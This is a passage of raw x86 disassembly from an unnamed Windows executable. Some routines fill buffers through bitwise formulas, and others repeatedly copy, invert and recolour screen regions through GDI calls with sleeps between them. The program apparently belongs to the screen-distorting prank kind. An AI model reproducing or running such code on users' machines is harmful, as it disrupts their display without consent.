  401719:	c1 fa 02             	sar    $0x2,%edx
  40171c:	c1 fb 05             	sar    $0x5,%ebx
  40171f:	0f b6 d2             	movzbl %dl,%edx
  401722:	0f b6 cb             	movzbl %bl,%ecx
  401725:	0f af d1             	imul   %ecx,%edx
  401728:	0a d3                	or     %bl,%dl
  40172a:	88 14 38             	mov    %dl,(%eax,%edi,1)
  40172d:	40                   	inc    %eax
  40172e:	3b c6                	cmp    %esi,%eax
  401730:	7c e3                	jl     0x401715
  401732:	5f                   	pop    %edi
  401733:	5b                   	pop    %ebx
  401734:	5e                   	pop    %esi
  401735:	5d                   	pop    %ebp
  401736:	c3                   	ret
  401737:	cc                   	int3
  401738:	cc                   	int3
  401739:	cc                   	int3
  40173a:	cc                   	int3
  40173b:	cc                   	int3
  40173c:	cc                   	int3
  40173d:	cc                   	int3
  40173e:	cc                   	int3
  40173f:	cc                   	int3
  401740:	55                   	push   %ebp
  401741:	8b ec                	mov    %esp,%ebp
  401743:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401746:	33 c0                	xor    %eax,%eax
  401748:	56                   	push   %esi
  401749:	8d 34 09             	lea    (%ecx,%ecx,1),%esi
  40174c:	85 f6                	test   %esi,%esi
  40174e:	7e 2d                	jle    0x40177d
  401750:	57                   	push   %edi
  401751:	8b 7d 10             	mov    0x10(%ebp),%edi
  401754:	8a c8                	mov    %al,%cl
  401756:	8b d0                	mov    %eax,%edx
  401758:	80 f1 3f             	xor    $0x3f,%cl
  40175b:	c1 fa 05             	sar    $0x5,%edx
  40175e:	0a d1                	or     %cl,%dl
  401760:	8a c8                	mov    %al,%cl
  401762:	c0 e1 02             	shl    $0x2,%cl
  401765:	0a d1                	or     %cl,%dl
  401767:	8b c8                	mov    %eax,%ecx
  401769:	c1 f9 0b             	sar    $0xb,%ecx
  40176c:	22 d1                	and    %cl,%dl
  40176e:	0f b6 ca             	movzbl %dl,%ecx
  401771:	6b c9 64             	imul   $0x64,%ecx,%ecx
  401774:	88 0c 38             	mov    %cl,(%eax,%edi,1)
  401777:	40                   	inc    %eax
  401778:	3b c6                	cmp    %esi,%eax
  40177a:	7c d8                	jl     0x401754
  40177c:	5f                   	pop    %edi
  40177d:	5e                   	pop    %esi
  40177e:	5d                   	pop    %ebp
  40177f:	c3                   	ret
  401780:	55                   	push   %ebp
  401781:	8b ec                	mov    %esp,%ebp
  401783:	8b 45 0c             	mov    0xc(%ebp),%eax
  401786:	56                   	push   %esi
  401787:	57                   	push   %edi
  401788:	33 f6                	xor    %esi,%esi
  40178a:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  40178d:	85 ff                	test   %edi,%edi
  40178f:	7e 2c                	jle    0x4017bd
  401791:	53                   	push   %ebx
  401792:	8b 5d 10             	mov    0x10(%ebp),%ebx
  401795:	8b c6                	mov    %esi,%eax
  401797:	8b ce                	mov    %esi,%ecx
  401799:	c1 f8 09             	sar    $0x9,%eax
  40179c:	0f af c6             	imul   %esi,%eax
  40179f:	c1 f9 0e             	sar    $0xe,%ecx
  4017a2:	83 e1 03             	and    $0x3,%ecx
  4017a5:	83 c1 04             	add    $0x4,%ecx
  4017a8:	99                   	cltd
  4017a9:	f7 f9                	idiv   %ecx
  4017ab:	8b d6                	mov    %esi,%edx
  4017ad:	c1 ea 03             	shr    $0x3,%edx
  4017b0:	8b c8                	mov    %eax,%ecx
  4017b2:	d3 fa                	sar    %cl,%edx
  4017b4:	88 14 1e             	mov    %dl,(%esi,%ebx,1)
  4017b7:	46                   	inc    %esi
  4017b8:	3b f7                	cmp    %edi,%esi
  4017ba:	7c d9                	jl     0x401795
  4017bc:	5b                   	pop    %ebx
  4017bd:	5f                   	pop    %edi
  4017be:	5e                   	pop    %esi
  4017bf:	5d                   	pop    %ebp
  4017c0:	c3                   	ret
  4017c1:	cc                   	int3
  4017c2:	cc                   	int3
  4017c3:	cc                   	int3
  4017c4:	cc                   	int3
  4017c5:	cc                   	int3
  4017c6:	cc                   	int3
  4017c7:	cc                   	int3
  4017c8:	cc                   	int3
  4017c9:	cc                   	int3
  4017ca:	cc                   	int3
  4017cb:	cc                   	int3
  4017cc:	cc                   	int3
  4017cd:	cc                   	int3
  4017ce:	cc                   	int3
  4017cf:	cc                   	int3
  4017d0:	55                   	push   %ebp
  4017d1:	8b ec                	mov    %esp,%ebp
  4017d3:	51                   	push   %ecx
  4017d4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4017d7:	03 c0                	add    %eax,%eax
  4017d9:	53                   	push   %ebx
  4017da:	33 db                	xor    %ebx,%ebx
  4017dc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4017df:	85 c0                	test   %eax,%eax
  4017e1:	0f 8e 80 00 00 00    	jle    0x401867
  4017e7:	56                   	push   %esi
  4017e8:	57                   	push   %edi
  4017e9:	33 ff                	xor    %edi,%edi
  4017eb:	33 f6                	xor    %esi,%esi
  4017ed:	0f 1f 00             	nopl   (%eax)
  4017f0:	f7 c3 00 80 00 00    	test   $0x8000,%ebx
  4017f6:	74 0e                	je     0x401806
  4017f8:	b8 93 24 49 92       	mov    $0x92492493,%eax
  4017fd:	f7 ee                	imul   %esi
  4017ff:	03 d6                	add    %esi,%edx
  401801:	c1 fa 02             	sar    $0x2,%edx
  401804:	eb 26                	jmp    0x40182c
  401806:	f7 c3 00 00 01 00    	test   $0x10000,%ebx
  40180c:	74 07                	je     0x401815
  40180e:	8b cf                	mov    %edi,%ecx
  401810:	83 e1 64             	and    $0x64,%ecx
  401813:	eb 0e                	jmp    0x401823
  401815:	8b c3                	mov    %ebx,%eax
  401817:	83 e0 64             	and    $0x64,%eax
  40181a:	8b c8                	mov    %eax,%ecx
  40181c:	f7 d9                	neg    %ecx
  40181e:	c1 e1 03             	shl    $0x3,%ecx
  401821:	2b c8                	sub    %eax,%ecx
  401823:	b8 e9 a2 8b 2e       	mov    $0x2e8ba2e9,%eax
  401828:	f7 e9                	imul   %ecx
  40182a:	d1 fa                	sar    $1,%edx
  40182c:	8b c2                	mov    %edx,%eax
  40182e:	83 ee 06             	sub    $0x6,%esi
  401831:	c1 e8 1f             	shr    $0x1f,%eax
  401834:	83 ef 09             	sub    $0x9,%edi
  401837:	03 c2                	add    %edx,%eax
  401839:	89 45 0c             	mov    %eax,0xc(%ebp)
  40183c:	8a c3                	mov    %bl,%al
  40183e:	c0 e0 02             	shl    $0x2,%al
  401841:	8d 0c 18             	lea    (%eax,%ebx,1),%ecx
  401844:	8b c3                	mov    %ebx,%eax
  401846:	22 cb                	and    %bl,%cl
  401848:	c1 f8 06             	sar    $0x6,%eax
  40184b:	0a c8                	or     %al,%cl
  40184d:	0a 4d 0c             	or     0xc(%ebp),%cl
  401850:	8a c1                	mov    %cl,%al
  401852:	c0 e1 02             	shl    $0x2,%cl
  401855:	02 c1                	add    %cl,%al
  401857:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40185a:	02 c0                	add    %al,%al
  40185c:	88 04 0b             	mov    %al,(%ebx,%ecx,1)
  40185f:	43                   	inc    %ebx
  401860:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  401863:	7c 8b                	jl     0x4017f0
  401865:	5f                   	pop    %edi
  401866:	5e                   	pop    %esi
  401867:	5b                   	pop    %ebx
  401868:	8b e5                	mov    %ebp,%esp
  40186a:	5d                   	pop    %ebp
  40186b:	c3                   	ret
  40186c:	cc                   	int3
  40186d:	cc                   	int3
  40186e:	cc                   	int3
  40186f:	cc                   	int3
  401870:	55                   	push   %ebp
  401871:	8b ec                	mov    %esp,%ebp
  401873:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401876:	33 c0                	xor    %eax,%eax
  401878:	56                   	push   %esi
  401879:	8d 34 09             	lea    (%ecx,%ecx,1),%esi
  40187c:	85 f6                	test   %esi,%esi
  40187e:	7e 3b                	jle    0x4018bb
  401880:	53                   	push   %ebx
  401881:	57                   	push   %edi
  401882:	8b 7d 10             	mov    0x10(%ebp),%edi
  401885:	8b c8                	mov    %eax,%ecx
  401887:	8b d8                	mov    %eax,%ebx
  401889:	c1 f9 0f             	sar    $0xf,%ecx
  40188c:	d3 fb                	sar    %cl,%ebx
  40188e:	8b c8                	mov    %eax,%ecx
  401890:	c1 f9 07             	sar    $0x7,%ecx
  401893:	0a d9                	or     %cl,%bl
  401895:	8a c8                	mov    %al,%cl
  401897:	02 c9                	add    %cl,%cl
  401899:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  40189c:	8b c8                	mov    %eax,%ecx
  40189e:	0a da                	or     %dl,%bl
  4018a0:	c1 f9 08             	sar    $0x8,%ecx
  4018a3:	8a d3                	mov    %bl,%dl
  4018a5:	80 e1 05             	and    $0x5,%cl
  4018a8:	c0 e3 02             	shl    $0x2,%bl
  4018ab:	02 d3                	add    %bl,%dl
  4018ad:	02 d2                	add    %dl,%dl
  4018af:	02 d1                	add    %cl,%dl
  4018b1:	88 14 38             	mov    %dl,(%eax,%edi,1)
  4018b4:	40                   	inc    %eax
  4018b5:	3b c6                	cmp    %esi,%eax
  4018b7:	7c cc                	jl     0x401885
  4018b9:	5f                   	pop    %edi
  4018ba:	5b                   	pop    %ebx
  4018bb:	5e                   	pop    %esi
  4018bc:	5d                   	pop    %ebp
  4018bd:	c3                   	ret
  4018be:	cc                   	int3
  4018bf:	cc                   	int3
  4018c0:	55                   	push   %ebp
  4018c1:	8b ec                	mov    %esp,%ebp
  4018c3:	51                   	push   %ecx
  4018c4:	a1 fc 81 41 00       	mov    0x4181fc,%eax
  4018c9:	53                   	push   %ebx
  4018ca:	57                   	push   %edi
  4018cb:	33 ff                	xor    %edi,%edi
  4018cd:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4018d0:	8d 58 1e             	lea    0x1e(%eax),%ebx
  4018d3:	3b c3                	cmp    %ebx,%eax
  4018d5:	73 2d                	jae    0x401904
  4018d7:	56                   	push   %esi
  4018d8:	6a 00                	push   $0x0
  4018da:	ff 15 84 01 41 00    	call   *0x410184
  4018e0:	8b f0                	mov    %eax,%esi
  4018e2:	56                   	push   %esi
  4018e3:	57                   	push   %edi
  4018e4:	ff 55 fc             	call   *-0x4(%ebp)
  4018e7:	83 c4 08             	add    $0x8,%esp
  4018ea:	56                   	push   %esi
  4018eb:	6a 00                	push   $0x0
  4018ed:	ff 15 70 01 41 00    	call   *0x410170
  4018f3:	56                   	push   %esi
  4018f4:	ff 15 48 00 41 00    	call   *0x410048
  4018fa:	47                   	inc    %edi
  4018fb:	39 1d fc 81 41 00    	cmp    %ebx,0x4181fc
  401901:	72 d5                	jb     0x4018d8
  401903:	5e                   	pop    %esi
  401904:	68 85 00 00 00       	push   $0x85
  401909:	6a 00                	push   $0x0
  40190b:	6a 00                	push   $0x0
  40190d:	6a 00                	push   $0x0
  40190f:	ff 15 6c 01 41 00    	call   *0x41016c
  401915:	6a 64                	push   $0x64
  401917:	ff 15 a8 00 41 00    	call   *0x4100a8
  40191d:	5f                   	pop    %edi
  40191e:	5b                   	pop    %ebx
  40191f:	8b e5                	mov    %ebp,%esp
  401921:	5d                   	pop    %ebp
  401922:	c3                   	ret
  401923:	cc                   	int3
  401924:	cc                   	int3
  401925:	cc                   	int3
  401926:	cc                   	int3
  401927:	cc                   	int3
  401928:	cc                   	int3
  401929:	cc                   	int3
  40192a:	cc                   	int3
  40192b:	cc                   	int3
  40192c:	cc                   	int3
  40192d:	cc                   	int3
  40192e:	cc                   	int3
  40192f:	cc                   	int3
  401930:	55                   	push   %ebp
  401931:	8b ec                	mov    %esp,%ebp
  401933:	83 e4 f0             	and    $0xfffffff0,%esp
  401936:	83 ec 28             	sub    $0x28,%esp
  401939:	8b 45 08             	mov    0x8(%ebp),%eax
  40193c:	0f 57 c0             	xorps  %xmm0,%xmm0
  40193f:	56                   	push   %esi
  401940:	8b 35 80 01 41 00    	mov    0x410180,%esi
  401946:	89 44 24 04          	mov    %eax,0x4(%esp)
  40194a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40194d:	57                   	push   %edi
  40194e:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401952:	8d 44 24 20          	lea    0x20(%esp),%eax
  401956:	50                   	push   %eax
  401957:	68 50 42 40 00       	push   $0x404250
  40195c:	6a 00                	push   $0x0
  40195e:	6a 00                	push   $0x0
  401960:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  401965:	ff d6                	call   *%esi
  401967:	8d 44 24 10          	lea    0x10(%esp),%eax
  40196b:	0f 57 c0             	xorps  %xmm0,%xmm0
  40196e:	50                   	push   %eax
  40196f:	68 50 42 40 00       	push   $0x404250
  401974:	6a 00                	push   $0x0
  401976:	6a 00                	push   $0x0
  401978:	0f 29 44 24 20       	movaps %xmm0,0x20(%esp)
  40197d:	ff d6                	call   *%esi
  40197f:	8b 44 24 08          	mov    0x8(%esp),%eax
  401983:	8b 7c 24 18          	mov    0x18(%esp),%edi
  401987:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  40198b:	2b 7c 24 10          	sub    0x10(%esp),%edi
  40198f:	2b 74 24 14          	sub    0x14(%esp),%esi
  401993:	99                   	cltd
  401994:	2b c2                	sub    %edx,%eax
  401996:	d1 f8                	sar    $1,%eax
  401998:	25 ff 00 00 80       	and    $0x800000ff,%eax
  40199d:	79 07                	jns    0x4019a6
  40199f:	48                   	dec    %eax
  4019a0:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4019a5:	40                   	inc    %eax
  4019a6:	0f b6 c0             	movzbl %al,%eax
  4019a9:	8b c8                	mov    %eax,%ecx
  4019ab:	c1 e1 08             	shl    $0x8,%ecx
  4019ae:	0b c8                	or     %eax,%ecx
  4019b0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4019b4:	c1 e1 08             	shl    $0x8,%ecx
  4019b7:	25 ff 00 00 80       	and    $0x800000ff,%eax
  4019bc:	79 07                	jns    0x4019c5
  4019be:	48                   	dec    %eax
  4019bf:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4019c4:	40                   	inc    %eax
  4019c5:	0f b6 c0             	movzbl %al,%eax
  4019c8:	0b c8                	or     %eax,%ecx
  4019ca:	51                   	push   %ecx
  4019cb:	ff 15 4c 00 41 00    	call   *0x41004c
  4019d1:	50                   	push   %eax
  4019d2:	ff 74 24 10          	push   0x10(%esp)
  4019d6:	ff 15 14 00 41 00    	call   *0x410014
  4019dc:	68 49 00 5a 00       	push   $0x5a0049
  4019e1:	56                   	push   %esi
  4019e2:	57                   	push   %edi
  4019e3:	ff 74 24 30          	push   0x30(%esp)
  4019e7:	ff 74 24 30          	push   0x30(%esp)
  4019eb:	ff 74 24 20          	push   0x20(%esp)
  4019ef:	ff 15 20 00 41 00    	call   *0x410020
  4019f5:	6a 0f                	push   $0xf
  4019f7:	ff 15 a8 00 41 00    	call   *0x4100a8
  4019fd:	5f                   	pop    %edi
  4019fe:	5e                   	pop    %esi
  4019ff:	8b e5                	mov    %ebp,%esp
  401a01:	5d                   	pop    %ebp
  401a02:	c3                   	ret
  401a03:	cc                   	int3
  401a04:	cc                   	int3
  401a05:	cc                   	int3
  401a06:	cc                   	int3
  401a07:	cc                   	int3
  401a08:	cc                   	int3
  401a09:	cc                   	int3
  401a0a:	cc                   	int3
  401a0b:	cc                   	int3
  401a0c:	cc                   	int3
  401a0d:	cc                   	int3
  401a0e:	cc                   	int3
  401a0f:	cc                   	int3
  401a10:	55                   	push   %ebp
  401a11:	8b ec                	mov    %esp,%ebp
  401a13:	83 e4 f0             	and    $0xfffffff0,%esp
  401a16:	83 ec 38             	sub    $0x38,%esp
  401a19:	8b 45 0c             	mov    0xc(%ebp),%eax
  401a1c:	0f 57 c0             	xorps  %xmm0,%xmm0
  401a1f:	56                   	push   %esi
  401a20:	8b 35 80 01 41 00    	mov    0x410180,%esi
  401a26:	57                   	push   %edi
  401a27:	89 44 24 14          	mov    %eax,0x14(%esp)
  401a2b:	8d 44 24 30          	lea    0x30(%esp),%eax
  401a2f:	50                   	push   %eax
  401a30:	68 50 42 40 00       	push   $0x404250
  401a35:	6a 00                	push   $0x0
  401a37:	6a 00                	push   $0x0
  401a39:	0f 29 44 24 40       	movaps %xmm0,0x40(%esp)
  401a3e:	ff d6                	call   *%esi
  401a40:	8d 44 24 20          	lea    0x20(%esp),%eax
  401a44:	0f 57 c0             	xorps  %xmm0,%xmm0
  401a47:	50                   	push   %eax
  401a48:	68 50 42 40 00       	push   $0x404250
  401a4d:	6a 00                	push   $0x0
  401a4f:	6a 00                	push   $0x0
  401a51:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  401a56:	ff d6                	call   *%esi
  401a58:	8b 44 24 28          	mov    0x28(%esp),%eax
  401a5c:	2b 44 24 20          	sub    0x20(%esp),%eax
  401a60:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  401a64:	2b 7c 24 24          	sub    0x24(%esp),%edi
  401a68:	89 44 24 18          	mov    %eax,0x18(%esp)
  401a6c:	8b 45 08             	mov    0x8(%ebp),%eax
  401a6f:	8b 74 24 34          	mov    0x34(%esp),%esi
  401a73:	68 a6 00 11 00       	push   $0x1100a6
  401a78:	89 7c 24 20          	mov    %edi,0x20(%esp)
  401a7c:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  401a7f:	03 c9                	add    %ecx,%ecx
  401a81:	8b c1                	mov    %ecx,%eax
  401a83:	99                   	cltd
  401a84:	f7 ff                	idiv   %edi
  401a86:	8b c1                	mov    %ecx,%eax
  401a88:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401a8c:	03 d6                	add    %esi,%edx
  401a8e:	52                   	push   %edx
  401a8f:	99                   	cltd
  401a90:	f7 f9                	idiv   %ecx
  401a92:	8b 44 24 38          	mov    0x38(%esp),%eax
  401a96:	03 d0                	add    %eax,%edx
  401a98:	52                   	push   %edx
  401a99:	8b 54 24 20          	mov    0x20(%esp),%edx
  401a9d:	52                   	push   %edx
  401a9e:	57                   	push   %edi
  401a9f:	51                   	push   %ecx
  401aa0:	56                   	push   %esi
  401aa1:	50                   	push   %eax
  401aa2:	52                   	push   %edx
  401aa3:	ff 15 0c 00 41 00    	call   *0x41000c
  401aa9:	e8 56 4b 00 00       	call   0x406604
  401aae:	25 ff 00 00 80       	and    $0x800000ff,%eax
  401ab3:	79 07                	jns    0x401abc
  401ab5:	48                   	dec    %eax
  401ab6:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  401abb:	40                   	inc    %eax
  401abc:	0f b6 f0             	movzbl %al,%esi
  401abf:	c1 e6 08             	shl    $0x8,%esi
  401ac2:	e8 3d 4b 00 00       	call   0x406604
  401ac7:	25 ff 00 00 80       	and    $0x800000ff,%eax
  401acc:	79 07                	jns    0x401ad5
  401ace:	48                   	dec    %eax
  401acf:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  401ad4:	40                   	inc    %eax
  401ad5:	0f b6 f8             	movzbl %al,%edi
  401ad8:	0b fe                	or     %esi,%edi
  401ada:	c1 e7 08             	shl    $0x8,%edi
  401add:	e8 22 4b 00 00       	call   0x406604
  401ae2:	25 ff 00 00 80       	and    $0x800000ff,%eax
  401ae7:	79 07                	jns    0x401af0
  401ae9:	48                   	dec    %eax
  401aea:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  401aef:	40                   	inc    %eax
  401af0:	0f b6 c0             	movzbl %al,%eax
  401af3:	0b c7                	or     %edi,%eax
  401af5:	50                   	push   %eax
  401af6:	ff 15 4c 00 41 00    	call   *0x41004c
  401afc:	8b 74 24 14          	mov    0x14(%esp),%esi
  401b00:	50                   	push   %eax
  401b01:	56                   	push   %esi
  401b02:	ff 15 14 00 41 00    	call   *0x410014
  401b08:	68 49 00 5a 00       	push   $0x5a0049
  401b0d:	ff 74 24 20          	push   0x20(%esp)
  401b11:	ff 74 24 20          	push   0x20(%esp)
  401b15:	ff 74 24 40          	push   0x40(%esp)
  401b19:	ff 74 24 40          	push   0x40(%esp)
  401b1d:	56                   	push   %esi
  401b1e:	ff 15 20 00 41 00    	call   *0x410020
  401b24:	6a 0f                	push   $0xf
  401b26:	ff 15 a8 00 41 00    	call   *0x4100a8
  401b2c:	5f                   	pop    %edi
  401b2d:	5e                   	pop    %esi
  401b2e:	8b e5                	mov    %ebp,%esp
  401b30:	5d                   	pop    %ebp
  401b31:	c3                   	ret
  401b32:	cc                   	int3
  401b33:	cc                   	int3
  401b34:	cc                   	int3
  401b35:	cc                   	int3
  401b36:	cc                   	int3
  401b37:	cc                   	int3
  401b38:	cc                   	int3
  401b39:	cc                   	int3
  401b3a:	cc                   	int3
  401b3b:	cc                   	int3
  401b3c:	cc                   	int3
  401b3d:	cc                   	int3
  401b3e:	cc                   	int3
  401b3f:	cc                   	int3
  401b40:	55                   	push   %ebp
  401b41:	8b ec                	mov    %esp,%ebp
  401b43:	83 e4 f0             	and    $0xfffffff0,%esp
  401b46:	83 ec 58             	sub    $0x58,%esp
  401b49:	8b 45 0c             	mov    0xc(%ebp),%eax
  401b4c:	0f 57 c0             	xorps  %xmm0,%xmm0
  401b4f:	56                   	push   %esi
  401b50:	8b 35 80 01 41 00    	mov    0x410180,%esi
  401b56:	57                   	push   %edi
  401b57:	89 44 24 18          	mov    %eax,0x18(%esp)
  401b5b:	8d 44 24 30          	lea    0x30(%esp),%eax
  401b5f:	50                   	push   %eax
  401b60:	68 50 42 40 00       	push   $0x404250
  401b65:	6a 00                	push   $0x0
  401b67:	6a 00                	push   $0x0
  401b69:	0f 29 44 24 40       	movaps %xmm0,0x40(%esp)
  401b6e:	ff d6                	call   *%esi
  401b70:	8d 44 24 50          	lea    0x50(%esp),%eax
  401b74:	0f 57 c0             	xorps  %xmm0,%xmm0
  401b77:	50                   	push   %eax
  401b78:	68 50 42 40 00       	push   $0x404250
  401b7d:	6a 00                	push   $0x0
  401b7f:	6a 00                	push   $0x0
  401b81:	0f 29 44 24 60       	movaps %xmm0,0x60(%esp)
  401b86:	ff d6                	call   *%esi
  401b88:	8b 44 24 58          	mov    0x58(%esp),%eax
  401b8c:	8b 7c 24 5c          	mov    0x5c(%esp),%edi
  401b90:	2b 44 24 50          	sub    0x50(%esp),%eax
  401b94:	2b 7c 24 54          	sub    0x54(%esp),%edi
  401b98:	ff 74 24 18          	push   0x18(%esp)
  401b9c:	89 44 24 18          	mov    %eax,0x18(%esp)
  401ba0:	89 7c 24 24          	mov    %edi,0x24(%esp)
  401ba4:	ff 15 1c 00 41 00    	call   *0x41001c
  401baa:	57                   	push   %edi
  401bab:	ff 74 24 18          	push   0x18(%esp)
  401baf:	8b f0                	mov    %eax,%esi
  401bb1:	ff 74 24 20          	push   0x20(%esp)
  401bb5:	89 74 24 38          	mov    %esi,0x38(%esp)
  401bb9:	ff 15 10 00 41 00    	call   *0x410010
  401bbf:	50                   	push   %eax
  401bc0:	56                   	push   %esi
  401bc1:	89 44 24 54          	mov    %eax,0x54(%esp)
  401bc5:	ff 15 14 00 41 00    	call   *0x410014
  401bcb:	8b 7c 24 34          	mov    0x34(%esp),%edi
  401bcf:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401bd3:	68 20 00 cc 00       	push   $0xcc0020
  401bd8:	57                   	push   %edi
  401bd9:	51                   	push   %ecx
  401bda:	ff 74 24 24          	push   0x24(%esp)
  401bde:	ff 74 24 30          	push   0x30(%esp)
  401be2:	ff 74 24 28          	push   0x28(%esp)
  401be6:	57                   	push   %edi
  401be7:	51                   	push   %ecx
  401be8:	56                   	push   %esi
  401be9:	ff 15 0c 00 41 00    	call   *0x41000c
  401bef:	b8 67 66 66 66       	mov    $0x66666667,%eax
  401bf4:	f7 6c 24 14          	imull  0x14(%esp)
  401bf8:	8b 44 24 30          	mov    0x30(%esp),%eax
  401bfc:	c1 fa 02             	sar    $0x2,%edx
  401bff:	8b ca                	mov    %edx,%ecx
  401c01:	c1 e9 1f             	shr    $0x1f,%ecx
  401c04:	03 ca                	add    %edx,%ecx
  401c06:	3b c1                	cmp    %ecx,%eax
  401c08:	0f 8f 91 00 00 00    	jg     0x401c9f
  401c0e:	b8 67 66 66 66       	mov    $0x66666667,%eax
  401c13:	f7 6c 24 20          	imull  0x20(%esp)
  401c17:	c1 fa 02             	sar    $0x2,%edx
  401c1a:	8b f2                	mov    %edx,%esi
  401c1c:	c1 ee 1f             	shr    $0x1f,%esi
  401c1f:	03 f2                	add    %edx,%esi
  401c21:	8b 54 24 30          	mov    0x30(%esp),%edx
  401c25:	2b ca                	sub    %edx,%ecx
  401c27:	89 74 24 24          	mov    %esi,0x24(%esp)
  401c2b:	8d 04 92             	lea    (%edx,%edx,4),%eax
  401c2e:	03 c0                	add    %eax,%eax
  401c30:	41                   	inc    %ecx
  401c31:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401c35:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  401c39:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  401c40:	3b fe                	cmp    %esi,%edi
  401c42:	7f 43                	jg     0x401c87
  401c44:	8d 34 bf             	lea    (%edi,%edi,4),%esi
  401c47:	8b 7c 24 24          	mov    0x24(%esp),%edi
  401c4b:	2b 7c 24 34          	sub    0x34(%esp),%edi
  401c4f:	03 f6                	add    %esi,%esi
  401c51:	47                   	inc    %edi
  401c52:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  401c56:	68 20 00 cc 00       	push   $0xcc0020
  401c5b:	6a 01                	push   $0x1
  401c5d:	6a 01                	push   $0x1
  401c5f:	56                   	push   %esi
  401c60:	50                   	push   %eax
  401c61:	51                   	push   %ecx
  401c62:	6a 0a                	push   $0xa
  401c64:	6a 0a                	push   $0xa
  401c66:	56                   	push   %esi
  401c67:	50                   	push   %eax
  401c68:	51                   	push   %ecx
  401c69:	ff 15 28 00 41 00    	call   *0x410028
  401c6f:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401c73:	83 c6 0a             	add    $0xa,%esi
  401c76:	83 ef 01             	sub    $0x1,%edi
  401c79:	75 d7                	jne    0x401c52
  401c7b:	8b 7c 24 34          	mov    0x34(%esp),%edi
  401c7f:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  401c83:	8b 74 24 24          	mov    0x24(%esp),%esi
  401c87:	83 c0 0a             	add    $0xa,%eax
  401c8a:	83 e9 01             	sub    $0x1,%ecx
  401c8d:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401c91:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  401c95:	75 a9                	jne    0x401c40
  401c97:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  401c9b:	8b 44 24 30          	mov    0x30(%esp),%eax
  401c9f:	68 20 00 cc 00       	push   $0xcc0020
  401ca4:	57                   	push   %edi
  401ca5:	50                   	push   %eax
  401ca6:	56                   	push   %esi
  401ca7:	ff 74 24 30          	push   0x30(%esp)
  401cab:	ff 74 24 28          	push   0x28(%esp)
  401caf:	57                   	push   %edi
  401cb0:	50                   	push   %eax
  401cb1:	ff 74 24 38          	push   0x38(%esp)
  401cb5:	ff 15 0c 00 41 00    	call   *0x41000c
  401cbb:	56                   	push   %esi
  401cbc:	8b 35 48 00 41 00    	mov    0x410048,%esi
  401cc2:	ff d6                	call   *%esi
  401cc4:	ff 74 24 4c          	push   0x4c(%esp)
  401cc8:	ff d6                	call   *%esi
  401cca:	6a 64                	push   $0x64
  401ccc:	ff 15 a8 00 41 00    	call   *0x4100a8
  401cd2:	5f                   	pop    %edi
  401cd3:	5e                   	pop    %esi
  401cd4:	8b e5                	mov    %ebp,%esp
  401cd6:	5d                   	pop    %ebp
  401cd7:	c3                   	ret
  401cd8:	cc                   	int3
  401cd9:	cc                   	int3
  401cda:	cc                   	int3
  401cdb:	cc                   	int3
  401cdc:	cc                   	int3
  401cdd:	cc                   	int3
  401cde:	cc                   	int3
  401cdf:	cc                   	int3
  401ce0:	55                   	push   %ebp
  401ce1:	8b ec                	mov    %esp,%ebp
  401ce3:	83 e4 f0             	and    $0xfffffff0,%esp
  401ce6:	83 ec 38             	sub    $0x38,%esp
  401ce9:	8b 45 0c             	mov    0xc(%ebp),%eax
  401cec:	0f 57 c0             	xorps  %xmm0,%xmm0
  401cef:	56                   	push   %esi
  401cf0:	8b 35 80 01 41 00    	mov    0x410180,%esi
  401cf6:	57                   	push   %edi
  401cf7:	89 44 24 10          	mov    %eax,0x10(%esp)
  401cfb:	8d 44 24 30          	lea    0x30(%esp),%eax
  401cff:	50                   	push   %eax
  401d00:	68 50 42 40 00       	push   $0x404250
  401d05:	6a 00                	push   $0x0
  401d07:	6a 00                	push   $0x0
  401d09:	0f 29 44 24 40       	movaps %xmm0,0x40(%esp)
  401d0e:	ff d6                	call   *%esi
  401d10:	8d 44 24 20          	lea    0x20(%esp),%eax
  401d14:	0f 57 c0             	xorps  %xmm0,%xmm0
  401d17:	50                   	push   %eax
  401d18:	68 50 42 40 00       	push   $0x404250
  401d1d:	6a 00                	push   $0x0
  401d1f:	6a 00                	push   $0x0
  401d21:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  401d26:	ff d6                	call   *%esi
  401d28:	8b 74 24 28          	mov    0x28(%esp),%esi
  401d2c:	2b 74 24 20          	sub    0x20(%esp),%esi
  401d30:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  401d34:	ff 74 24 10          	push   0x10(%esp)
  401d38:	2b 7c 24 28          	sub    0x28(%esp),%edi
  401d3c:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  401d40:	ff 15 1c 00 41 00    	call   *0x41001c
  401d46:	57                   	push   %edi
  401d47:	56                   	push   %esi
  401d48:	ff 74 24 18          	push   0x18(%esp)
  401d4c:	89 44 24 20          	mov    %eax,0x20(%esp)
  401d50:	ff 15 10 00 41 00    	call   *0x410010
  401d56:	50                   	push   %eax
